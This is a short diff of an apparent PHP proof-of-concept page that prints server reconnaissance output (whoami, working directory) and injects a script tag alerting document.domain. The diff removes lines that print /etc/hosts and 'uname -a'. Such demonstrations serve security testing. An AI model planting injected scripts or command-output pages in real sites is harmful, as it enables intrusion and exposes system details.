@@ -20,10 +20,8 @@
     ECHO "<dd>".$whoami_output. "</dd>";
     ECHO "<b><dt>Present Working Directory:</dt></b>";
     ECHO "<dd>".$pwd_output."</dd>";
-    ECHO "<b><dt>Contents of /etc/hosts:</dt></b>";
-    ECHO "<dd><pre>".$catetchosts_output."</pre></dd>";
-    ECHO "<b><dt>uname -a:</b></dt>";
-    ECHO "<dd>".$uname_a."</dd>";
+    
+
     ECHO "<script>alert(\"Client Side Script Execution: \" + document.domain );var run = true</script><!--"
 ?>
 -->
